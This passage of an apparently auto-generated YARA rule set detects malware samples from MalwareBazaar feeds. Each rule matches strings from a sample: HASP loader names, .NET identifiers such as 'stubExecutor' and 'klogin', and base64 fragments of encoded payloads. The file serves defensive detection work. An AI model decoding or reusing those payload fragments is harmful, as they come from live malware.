      $s17 = "zhqtdjnnnum" fullword ascii
      $s18 = "fsqqqqq" fullword ascii
      $s19 = "uuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuuu" ascii
      $s20 = "yyqcksaa" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 3000KB and
      8 of them
}

rule sig_9e08aca3e0c6ef673c434f62fc3664942dce4f2a6654ba0cc660b1a767b79416 {
   meta:
      description = "evidences - file 9e08aca3e0c6ef673c434f62fc3664942dce4f2a6654ba0cc660b1a767b79416.exe"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "9e08aca3e0c6ef673c434f62fc3664942dce4f2a6654ba0cc660b1a767b79416"
   strings:
      $s1 = "%SystemRoot%\\System32\\Drivers\\Haspnt.sys" fullword ascii
      $s2 = "device=%SystemRoot%\\system32\\haspdos.sys" fullword ascii
      $s3 = "\\system\\hasput16.dll" fullword ascii
      $s4 = "haspvdd.dll" fullword ascii
      $s5 = "HASPVDD.DLL" fullword ascii
      $s6 = "HASPVDD.dll" fullword ascii
      $s7 = "haspdos.sys" fullword ascii
      $s8 = "NHSRVW32.EXE" fullword ascii
      $s9 = "Hsrvldr.exe" fullword ascii
      $s10 = "\\hasput16.dll" fullword ascii
      $s11 = "Failed to add the NetHASP LM loader object into the Service Control Manager Database" fullword ascii
      $s12 = "Failed to remove the NetHASP LM loader object from the Service Control Manager Database" fullword ascii
      $s13 = "Failed to write haspvdd.dll to the disk" fullword ascii
      $s14 = "kernel.dll" fullword ascii
      $s15 = "SYSTEM\\CurrentControlSet\\Services\\HASP Loader\\" fullword ascii
      $s16 = "Failed to write the HASPUT16.DLL to the disk" fullword ascii
      $s17 = "- Install the HASP Device Driver and the HASP NT Loader." fullword ascii
      $s18 = "HASP Loader Service" fullword ascii
      $s19 = "- Remove the HASP Device Driver and the HASP NT Loader." fullword ascii
      $s20 = "Warning: You removed the HASP Device Driver while the NetHASP LM loader is still installed" fullword ascii
   condition:
      uint16(0) == 0x5a4d and filesize < 700KB and
      8 of them
}

rule sig_42c9e28bbd2664f392239112d780d7976ede49729330c9596e44d7475308bf39 {
   meta:
      description = "evidences - file 42c9e28bbd2664f392239112d780d7976ede49729330c9596e44d7475308bf39.img"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "42c9e28bbd2664f392239112d780d7976ede49729330c9596e44d7475308bf39"
   strings:
      $s1 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii
      $s2 = "Hpbsbq.exe" fullword wide
      $s3 = "IdentifyAdaptableProcessor" fullword ascii
      $s4 = "stubExecutor" fullword ascii
      $s5 = "klogin" fullword wide
      $s6 = "CheckAutomatedProcessor" fullword ascii
      $s7 = "ViewProcessor" fullword ascii
      $s8 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii
      $s9 = "HPBSBQ.EXE;1" fullword ascii
      $s10 = "recordEncryptor" fullword ascii
      $s11 = "ConvertEncryptor" fullword ascii
      $s12 = "_MemberEncryptorNote" fullword ascii
      $s13 = "Hpbsbq.exe;1" fullword wide
      $s14 = "InvokeOperationalSorter" fullword ascii
      $s15 = "nameserver" fullword wide
      $s16 = "Cannot listen on an unusable interface. Check the IsUsable property before attemping to bind." fullword wide
      $s17 = "CompareOperationalMatcher" fullword ascii
      $s18 = "DSockets.Matching.ExpandableMatcher+<GetConnectedInterfaceAsync>d__11" fullword ascii
      $s19 = "executorCollection" fullword ascii
      $s20 = "InvokeAutomatableRunner" fullword ascii
   condition:
      uint16(0) == 0x0000 and filesize < 4000KB and
      8 of them
}

rule sig_78372bae606f77e310750a376a73f83aaa2bdd0a256144f72050b079b023b7e9 {
   meta:
      description = "evidences - file 78372bae606f77e310750a376a73f83aaa2bdd0a256144f72050b079b023b7e9.img"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "78372bae606f77e310750a376a73f83aaa2bdd0a256144f72050b079b023b7e9"
   strings:
      $s1 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.R" ascii
      $s2 = "Xqokzdopg.exe" fullword wide
      $s3 = "klogin" fullword wide
      $s4 = "        <requestedExecutionLevel level=\"asInvoker\" uiAccess=\"false\"/>" fullword ascii
      $s5 = "XQOKZDOPG.EXE;1" fullword ascii
      $s6 = "RenameFlexibleEncryptor" fullword ascii
      $s7 = "Xqokzdopg.exe;1" fullword wide
      $s8 = "nameserver" fullword wide
      $s9 = "Cannot listen on an unusable interface. Check the IsUsable property before attemping to bind." fullword wide
      $s10 = "ASockets.DecisionMaking.DeciderAuthorizer+<RunMessageReceiver>d__4" fullword ascii
      $s11 = "overrideres" fullword ascii
      $s12 = "m_GeneratorCommand" fullword ascii
      $s13 = "DetermineOperationalToken" fullword ascii
      $s14 = "  <assemblyIdentity version=\"1.0.0.0\" name=\"MyApplication.app\"/>" fullword ascii
      $s15 = "remotefs" fullword wide
      $s16 = "versionasset" fullword ascii
      $s17 = "_IteratorDecryptor" fullword ascii
      $s18 = "versionresult" fullword ascii
      $s19 = "offsetconnection" fullword ascii
      $s20 = ".NET Framework 4.5A" fullword ascii
   condition:
      uint16(0) == 0x0000 and filesize < 4000KB and
      8 of them
}

rule sig_2957edfc9b8ae3ec34b8a6a9089df6f896f271bbf1399203c8025fd6cb0731fa {
   meta:
      description = "evidences - file 2957edfc9b8ae3ec34b8a6a9089df6f896f271bbf1399203c8025fd6cb0731fa.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "2957edfc9b8ae3ec34b8a6a9089df6f896f271bbf1399203c8025fd6cb0731fa"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                        ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          ' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   ' */
      $s5 = "AAEAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string ' @             ' */
      $s6 = "BAAAAAAAAAAAA" ascii /* base64 encoded string '         ' */
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             ' */
      $s8 = "AAAAAADAAAAA" ascii /* base64 encoded string '    0   ' */
      $s9 = "v1GIT9ERg4Wag4WdyBSZiBCdv5mbhNGItFmcn9mcwBycphGVh0MTBgbINnAtA4guf4AAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAAAAAAAA" ascii
      $s10 = "G9//ATGAAAA9AAAAgAAAAswQE4QxBhgDHHEDOYcQQ4wwDRhDKEQTDIAwOYUBDShDBRghQ4QQDcIDOEkAFigDBBAAAEwt//vvoDAAAALAAAAQAQgDGHECOM8QM4wWLEEB" ascii
      $s11 = "hiEAAUAqAAAAgAwCDRgDDPECOogVg4wQCMICOEEAAAAAU9//hyAAAUAhAAAAgQgDDPECOM0CDRgDDbECOowZLEEBOMcQI4gCqBiDDJwgI4QQAAAAAc2//DK0AAQBQBAA" ascii
      $s12 = "=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s13 = "AAAAoAAACY4ADygDGRgDGHECOM8cLEEBOYcQI4wwKkkADMIDOEkAGigDJBAAAAwk//PrwAAAAwBAAAANAAQAISABMsRAIwXAAIleBAAAAAAAAAAFAsQQE4gCBJAIOMEA" ascii
      $s14 = "g4wQDMIDOEkAGigDBBAAAAwa//voMDAAHQBAAAANAQgDGHECOMsRM4QcLsEBOYcQI4wwBxgDK4FIOM0ADygDBJghI4QQAAAAAk2//LKlAAgBcDAAAQzCBRgDGHECOMcQ" ascii
      $s15 = "OMEHOUFIOgEHOM3CJRgDGHECOM8QM4gCMBiDFNwgM4QQCYICOEEAAAAACerTgD//oiIAAAAWAAAAEBABOYcQI4wwBxgDDBiDDxhDqBiDDxhDQBiDJxhDMBiDDNwgM4QQ" ascii
      $s16 = "OYcQI4wwDxgDK00CIRgDGHECOM8QM4gCHJgAg7wQCgtDQJA4Og0ADygDBJghI4QQAAAAAI6//7LiAAAAgBAAAw0CBRgDGHECOM8QM4gCJtwQE4gxBhgDDPEDOoATCIA4" ascii
      $s17 = "CAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                     ' */
      $s18 = "GY1tP0cdAX4//vfMordiIX0iQ30iM4VjhXHEI43gGQHwFSdRLCAAEEBhPYciAXIAA8ASoTCPJCAAAAwJ82IA21IrFloAAPIAAAAA4W0xAX0iAXUiAAQE1gOJEkIALybR" ascii
      $s19 = "UZ7D4nyAYPY0AEdiAAQAKQ4DAAAgAK89pTHgACIgiHoyhE99erTgD7v//HZjEA8gIsYT0hfiAwBJ8BIAAMgzoTCPJSAJElIAAEABIQCRHzBJ81IAAEgXEerTgDAA4AIA" ascii
      $s20 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAw4yMuYDIpUlTHhCI6M0QHBAAAAAMuMjL" ascii
   condition:
      uint16(0) == 0x413d and filesize < 100KB and
      8 of them
}

rule sig_35f5e0a715ea16af70f2a1b9e8936681eb281a507c745307a7f3a23e054e0193 {
   meta:
      description = "evidences - file 35f5e0a715ea16af70f2a1b9e8936681eb281a507c745307a7f3a23e054e0193.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "35f5e0a715ea16af70f2a1b9e8936681eb281a507c745307a7f3a23e054e0193"
   strings:
      $x1 = "==AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                           ' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s5 = "AAAAADEAAAA" ascii /* base64 encoded string '    1   ' */
      $s6 = "AAAAAAAAAC" ascii /* base64 encoded string '       ' */
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      ' */
      $s8 = "AAAAAAAAAEB" ascii /* base64 encoded string '       @' */
      $s9 = "DAAAAAAAAAAAA" ascii /* base64 encoded string '         ' */
      $s10 = "AAAAAFAAAB" ascii /* base64 encoded string '    P  ' */
      $s11 = "AAAAAAEBAAAA" ascii /* base64 encoded string '    @@  ' */
      $s12 = "AEAAAAAAAAAAAAAAA" ascii /* base64 encoded string ' @          ' */
      $s13 = "AAAAADAAAAAAAAAAAAAA" ascii /* base64 encoded string '    0          ' */
      $s14 = "5berTgDPqTPMsEcpvD91knUEDK77Y/60EQoLZ/xPa/FouF7gIVT3LLEnwyFDTkvc48YvEDoMDqaJzRwerTgDPIBMARoBusX9Gyzqx9WiFUDll2OQqbPaerTgD2L3taLS" ascii
      $s15 = "GEsgSgRAgYAHFLoEYgBCBLoEFACDYgBCYMAIGkgDBAAB5KYEOkAGJUQHNIxBH0AGYgAGDAgBJ4QuCGhDCIACHcwCQHoEYEAAGEfgSAAAFgR8BKhAHYQCJkgAAUAGJgQD" ascii
      $s16 = "BAAAAoCBAEAX7JA3KAgAYgiBGwyBK4NBAEAX9ZAACc8cEAQAbtnACIgEtQAABw1eCoAACcBKBIhBLYhCCEBAA8JAAAQOAMAMbAAAAoiBAIQ6oMgAioiBAIA3oIgHAAAA" ascii
      $s17 = "n9Gb5V2SAM2byB3XAQUSr92bo9FAMxERSF0TClVRLh0VA40VPRUWFt0XNdFAyV2Zn9Gb5V2SAM3ZvxUeltEZuV2UAQ3YlRXZEBQey9GdjVmcpRkcld2ZvxWeltEAyV2Z" ascii
      $s18 = "QBQRAEHADBgYAMHAJBgUAYEAQBgUAgGAqBATAQFAsBAeAQFApBgRAgHABBwbAAFAzAQSAMDAzBQVAMDAxAgeAgEAtBgbAUFAzBQQAkFAaBgQA0GAWBgMA8EAkBAbAgDA" ascii
      $s19 = "AYycKAAAlgCBAAwE8JgCAAAJerTgDZxMXQAAAExeCAAAAAAAAAAQAIAMToyGAAABV4PBAAwE8JABAAgE9NgAEAAAR0HGC4mKEAAAT03ACsBAAMQFerTgDTAAAIBfCQAA" ascii
      $s20 = "ENXQfRXZzBQZsJWdvR0cB9FdldGAyVGZpZ3byBFdh1mcvZUSAMXZslHdTJXZi1WdOBQZzJXYQlncUBQZsJWdvREAlJXd0xWdDRnbhlmchZnbJ9FdldGAu9Wa0FmepxWY" ascii
   condition:
      uint16(0) == 0x3d3d and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule sig_4b8fa4ed539cbe29b0a8d6b6bbc020405e6b2ad52e1fea5b29bc744271e9c110 {
   meta:
      description = "evidences - file 4b8fa4ed539cbe29b0a8d6b6bbc020405e6b2ad52e1fea5b29bc744271e9c110.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "4b8fa4ed539cbe29b0a8d6b6bbc020405e6b2ad52e1fea5b29bc744271e9c110"
   strings:
      $x1 = "==AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s3 = "BAAAAAAAAAAA" ascii /* base64 encoded string '        ' */ /* reversed goodware string 'AAAAAAAAAAAB' */
      $s4 = "DerTgDciE1LqcbfgEYerTgDgOnIIMQltPAJkQCJkQCJkQCJkQCZyxsrWkhFJkQ0xTdWYerTgDACJEdMEEPIAAciwoTCJ09PUIRCRNugaKoGAAAwxmBDJctIBr/edJXoZ" ascii
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                 ' */
      $s6 = "DAAAAAAAAAAAAAAA" ascii /* base64 encoded string '           ' */
      $s7 = "REREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREREQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABEQABE" ascii /* base64 encoded string 'DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D@ D' */
      $s8 = "AAAAAAAAAAAAAAAAAB" ascii /* base64 encoded string '             ' */
      $s9 = "FUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQBFUQB" ascii /* base64 encoded string 'Q EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ EQ ' */
      $s10 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 @  @            ' */
      $s11 = "AAAAAAAABA" ascii /* reversed goodware string 'ABAAAAAAAA' */
      $s12 = "AAAAAAAAAE" ascii /* base64 encoded string '       ' */
      $s13 = "AABAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '  @                                                                                             ' */
      $s14 = "AAAAAAAAAAAAE" ascii /* base64 encoded string '         ' */
      $s15 = "B4AfTFgD65fAOo33B4ge1EgD6VTAOo3EB4geTEgD5xfAOkH/B4geTEgD6dbAOoHTB4QeCHgD59YAOo33B4QeuFgD5xWAOkHTB4ggIGgDCiYAOIIPB4wgkGgDBudAOE4A" ascii
      $s16 = "QmcMAHDZnZG1wQCRHjn76xNLkQ0x81sfojCJEdMcSLX4kQCRHT352ZBIkQ0xIKiiBxBJEdMAAgAAUQCRHDARKyeJ/TBxDCQA3eF6oQCd/HFAqBFVkQUjQxBJM1IFkQUj" ascii
      $s17 = "EQ8gAQEYAUx/SRCFLerTgDw64nIBEPIAEBGAV8vVYkIDkQ0iMQ8gAAQWlgu1JeciQJlVmQHwFSAxDqfiAQEYEUx/XnoVBMXjDny8hM99TnI0hA99wnIAGY8//7vupDAA" ascii
      $s18 = "JerTgDv8DqciZnQ8hwevU1t9BadCTI0qiIegs3LVdbegFtpu0acgGnowpoBZFtkuZwGv6GfgRnQGsxruiHo5TOURhHYwpoLZFtUuPn4yB8/8DOe0LnYBbqLtCHowJaHB" ascii
      $s19 = "OHYQxHQoJndxJHoyJG99xnozxYk1BIfIcUfTpJfgjrgsW6cgWnocU04LbMRHyHIDREQHmHo1JyR9NlGkNCBBMZ7DQCJkQCJkQCcMS0BHNiBJEdsHKiBjUQCRHrxukQHE" ascii
      $s20 = "sYkxzuiRGfiKGZcspYkxjgiRG/0JGZsLmYkxNViRGjNJGZ8SjYkxlLiRGnUIGZs5gYkxH9hRGbiHGZcRdYkxXzhRGP0GGZ86aYkxBlhRGDCGGZ8XXYkxHbhRG3VFGZsz" ascii
   condition:
      uint16(0) == 0x3d3d and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule sig_5ab7b4ebaf9794a98546bfa9f8606c523f625a9e251d1f6b244b39e491609f0a {
   meta:
      description = "evidences - file 5ab7b4ebaf9794a98546bfa9f8606c523f625a9e251d1f6b244b39e491609f0a.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "5ab7b4ebaf9794a98546bfa9f8606c523f625a9e251d1f6b244b39e491609f0a"
   strings:
      $s1 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                           ' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                   ' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                                                                                                                                                              ' */
      $s5 = "==AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii
      $s6 = "DAAAAAAAAAAAA" ascii /* base64 encoded string '         ' */
      $s7 = "AAAAAAEBAAAA" ascii /* base64 encoded string '    @@  ' */
      $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAE" ascii /* base64 encoded string '                   ' */
      $s9 = "AAAAAAAAAAAAAE" ascii /* base64 encoded string '          ' */
      $s10 = "Dk9AYYRkDk9AYYhfDktAlYRcDkNATEQGDkNAFbhXCkNAFbhTCktAlYBREEiAlEQGEkBAFbRKBE+BjGQGEkgAlEQGEEwBLOg7AEzBFWh0Dk/B/VRyDk/BopAhDk+BhVhs" ascii
      $s11 = "AAwXfV2YuFGdz5WSf9VZz9GczlGRT81XlNmbhR3cul0XfVGdhVmcDJBbvN2b09mcQRnbllGbDBHd0hEch92UuMHbvN2b09mcQ5yclNWa2JXZT5iYldlLtVGdzl3U0AQA" ascii
      $s12 = "fAAAAAAAAA" ascii /* base64 encoded string '|      ' */
      $s13 = "3bD9FAAAAAAAAAAAAAAA" ascii /* base64 encoded string 'l?E           ' */
      $s14 = "IAAAAgHAAsQALEgAAAOAAAAAAAAAAcmIfZMADEATAAQRQBAAAAAAAAAJK0QDuUGZv1GIT9ERg4Wag4WdyBSZiBCdv5mbhNGItFmcn9mcwBycphGVh0MTBgbINnAtA4gu" ascii
      $s15 = "0AAAAAAAAAAA" ascii /* base64 encoded string '        ' */
      $s16 = "CAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '               ' */
      $s17 = "AAQTogBFRIKBAAgC+dBFRIKcAYgtyZBFRQxEBAAAt04GKAAAk+mCAAwoo8QEQEhCAAgovhxFRoAAAEKKKAAAd+mDRoAAAw5bOEhFWchEYEhCAAQooAAAAwJIAAQAAAiF" ascii
      $s18 = "uVGcPBQY0FGRAcmbpJ3b0lmbv1EA0VHculEAERFA39GZul2V0J3bwVmUAM3bEREAkFWZyhGVAI3byJXRk5WZTBwRT1EZuV2UAIEAul2Z1xGUAMlUAQWYlJFArNWYQBwZ" ascii
      $s19 = "DESBjGhmBkTBeugOAkFATEhhAkVBUGBgDkQBNugODEQAWHxUCEKATEQGCEKBOExSBEOAFHxPBE+AqFBJCEfBGGxDCEfBBCB5CEfAOCxvCkeB6BhrAEDAXAxlCkdBvtAr" ascii
      $s20 = "yVmdu92QAQjN05WSVBQey9Wbl1EbhNWazlHaQxWY09GVfRXZnBwbm5WSfRXZnBgclRXdw12bDJXZ2JXZTBAdjVmai9UZ0FmblRXYj52bDBQe0BXbFBAdjVmai9EduVWb" ascii
   condition:
      uint16(0) == 0x3d3d and filesize < 100KB and
      8 of them
}

rule sig_78ccb1e5214f02d14da8065470de3f18a8a00409215c3197a062e4b4a0c1d4d8 {
   meta:
      description = "evidences - file 78ccb1e5214f02d14da8065470de3f18a8a00409215c3197a062e4b4a0c1d4d8.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-13"
      hash1 = "78ccb1e5214f02d14da8065470de3f18a8a00409215c3197a062e4b4a0c1d4d8"
   strings:
      $x1 = "=AAAAAAAAADAAAAAMAQBQBAAAMDozA4MgNDQzQyMIID9yAvMsLD6yQuMgLD3ygtMULD0ywsMILDxyAsM8KDuyQrMwKDrygqMkKDoywpMYKDlyApMMKDiyQoMAKDdyAnM" ascii
      $s2 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                               ' */
      $s3 = "BAAAAAAAAAAA" ascii /* base64 encoded string '        ' */ /* reversed goodware string 'AAAAAAAAAAAB' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                                                                                                                                           ' */
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                 ' */
      $s6 = "AAAAAAAAAAAAAAAA4" ascii /* base64 encoded string '            ' */
      $s7 = "AAAAAAAAAAAAAAAA5" ascii /* base64 encoded string '            ' */
      $s8 = "eAAAAAAAAAAAAAAAA" ascii /* base64 encoded string 'x           ' */
      $s9 = "fAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '|           ' */
      $s10 = "R7DxerTgDkrPp6jnerTgDMoP35jcerTgDUmPV5DQerTgDYiPa4TDerTgDgQP73D89AePV3ju94aPp2Dn9wYP31TX9EVPE1zP9ITPn0zF9wAPxzT58AOPTzTm84IPDyze" ascii
      $s11 = "/w8P/erTgDjg/Q3Pl9DW/cyPZ8DDerTgDkvPU7TxerTgDkrPt6joerTgDcpPK6jeerTgDUmPV5jSerTgDQkP34TJerTgD0gPB0D/98ePo3j398bPu2jo9sZPO2jg9YXP" ascii
      $s12 = "erTgDUmPN5TQerTgDwjPq4jD9wePc3zz9ccP92jr9MaPT2Df9AXPr1jX9gUP40TM9USPOwD/8wNPQzjx8cLPpyzn8EJPHyTd8cFPKxTM8UCPgwzE8UwO4vT77EerTgDO" ascii
      $s13 = "NhCkDUmpdnquAQ0xgGKAMIcXb9lXQQ8gX/vVTVFUY3H86n7AAQ0xc2wiQ/PerTgDBgdfwbPgLqJ6nerTgD0vAQ0xcGKHkw2iYQCXLSBJ0toVXNVVD7FEEPo1/TCBJSAJ" ascii
      $s14 = "DKUEcgoGQwlMQwhtPAAAAAAgf8AEJNxDIf1DqgEEPIPEABxDyjQST8AyX9gIIBxDyjAQQ8g8JMxDIf1DAAAAYorGIBxDyDAEPIfP3ZcOSHTGx1YC2pcOzAVjMQCTLCBJ" ascii
      $s15 = "1lherTgDDKUEcgoHQwlMQwhtPAAAAAAgf8AEJNxDIf1DugEEPIPEABxDyjQST8AyX9gJIBxDyjAQQ8g8JMxDIf1DAAAAYorHIBxDyDAEPIfP3ZcOSHTGx1YC2pcO3AVj" ascii
      $s16 = "Fli79AIzMzMzMP8WeFAAFlS1FY871lherTgDDKUEcgoGQwlMQwhtPAAAAAAgf8AEJNxDIf1DqgEEPIPEABxDyjQST8AyX9gIIBxDyjAQQ8g8JMxDIf1DAAAAYorGIBxD" ascii
      $s17 = "BAAAAAAAAAAAA" ascii /* base64 encoded string '         ' */
      $s18 = "DAAAAAAAAAAAAAAA" ascii /* base64 encoded string '           ' */
      $s19 = "AAAAAAAAAAAAE" ascii /* base64 encoded string '         ' */
